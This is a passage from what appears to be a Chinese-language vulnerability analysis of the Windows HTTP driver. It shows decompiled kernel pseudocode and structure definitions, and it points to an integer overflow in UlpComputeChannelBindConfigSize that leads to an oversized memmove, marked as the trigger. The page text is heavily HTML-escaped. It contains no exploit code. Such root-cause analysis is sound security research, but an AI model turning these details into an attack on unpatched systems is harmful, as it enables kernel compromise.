&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v31,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v32,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v41);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> OutputBufferForOutDirect;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( OutputBufferForOutDirect &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v8 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v41 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OutputBufferForOutDirect &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2147483643&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2147483643&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (WPP_MAIN_CB.StackSize &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v21 &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v21 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v26 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v22 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>i64 &lt;span style="color:#f92672">*&lt;/span> v26) &lt;span style="color:#f92672">=&lt;/span> v32 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)(v24 &lt;span style="color:#f92672">-&lt;/span> v31);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>i64) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>i64 &lt;span style="color:#f92672">*&lt;/span> v26);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)v27 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> (_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> (_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)v24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v32 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)((_DWORD)v25 &lt;span style="color:#f92672">-&lt;/span> v31);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memmove&lt;/span>(v25, &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v35[&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> (_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> (_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)v24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFFFFFFFFFEu&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v32 &lt;span style="color:#f92672">+&lt;/span> (((_DWORD)v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFE&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memmove&lt;/span>(v28, &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>));&lt;span style="color:#75715e">// 触发漏洞
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v25 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v28[&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v27 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">++&lt;/span>v26;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> v39;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_32:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">int&lt;/span>)(OutputBufferForOutDirect &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x80000000&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> OutputBufferForOutDirect &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2147483643&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> v8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v3 &lt;span style="color:#f92672">=&lt;/span> v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)OutputBufferForOutDirect;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>UlpComputeChannelBindConfigSize&lt;/code>函数中存在整数溢出，该函数伪代码如下，rsi+10h处指向了用户传入的&lt;code>HTTP_CHANNEL_BIND_INFO&lt;/code>结构体，该结构体定义如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _HTTP_CHANNEL_BIND_INFO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG Flags;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PHTTP_SERVICE_BINDING_BASE &lt;span style="color:#f92672">*&lt;/span> ServiceNames;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG NumberOfServiceNames;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} HTTP_CHANNEL_BIND_INFO, &lt;span style="color:#f92672">*&lt;/span>PHTTP_CHANNEL_BIND_INFO;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">enum&lt;/span> _HTTP_AUTHENTICATION_HARDENING_LEVELS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HttpAuthenticationHardeningLegacy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HttpAuthenticationHardeningMedium,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HttpAuthenticationHardeningStrict
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} HTTP_AUTHENTICATION_HARDENING_LEVELS;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _HTTP_SERVICE_BINDING_BASE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_SERVICE_BINDING_TYPE Type;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} HTTP_SERVICE_BINDING_BASE, &lt;span style="color:#f92672">*&lt;/span>PHTTP_SERVICE_BINDING_BASE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _HTTP_SERVICE_BINDING_A
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_SERVICE_BINDING_BASE Base;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PCHAR Buffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG BufferSize;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} HTTP_SERVICE_BINDING_A, &lt;span style="color:#f92672">*&lt;/span>PHTTP_SERVICE_BINDING_A;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _HTTP_SERVICE_BINDING_W
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_SERVICE_BINDING_BASE Base;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PWCHAR Buffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG BufferSize;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} HTTP_SERVICE_BINDING_W, &lt;span style="color:#f92672">*&lt;/span>PHTTP_SERVICE_BINDING_W;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">UlpComputeChannelBindConfigSize&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, IRP &lt;span style="color:#f92672">*&lt;/span>a2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v4; &lt;span style="color:#75715e">// ebx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v6; &lt;span style="color:#75715e">// rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v7; &lt;span style="color:#75715e">// r9
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> _DWORD &lt;span style="color:#f92672">*&lt;/span>v8; &lt;span style="color:#75715e">// r8
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)a1 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v5 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">+=&lt;/span> (&lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>); &lt;span style="color:#75715e">// HTTP_CHANNEL_BIND_INFO 结构体
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">**&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v6);&lt;span style="color:#75715e">// ServiceName 结构体
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>v8 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> ) &lt;span style="color:#75715e">// 如果是HttpServiceBindingTypeW 则进入
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v4 &lt;span style="color:#f92672">=&lt;/span> (v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFE&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">+=&lt;/span> v8[&lt;span style="color:#ae81ff">4&lt;/span>]; &lt;span style="color:#75715e">// V8是enum HTTP_SERVICE_BINDING_BASE类型，占4个字节，则V8[4]就是V8 后面16个字节，即BufferSize
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v6 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)(v6 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v6 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
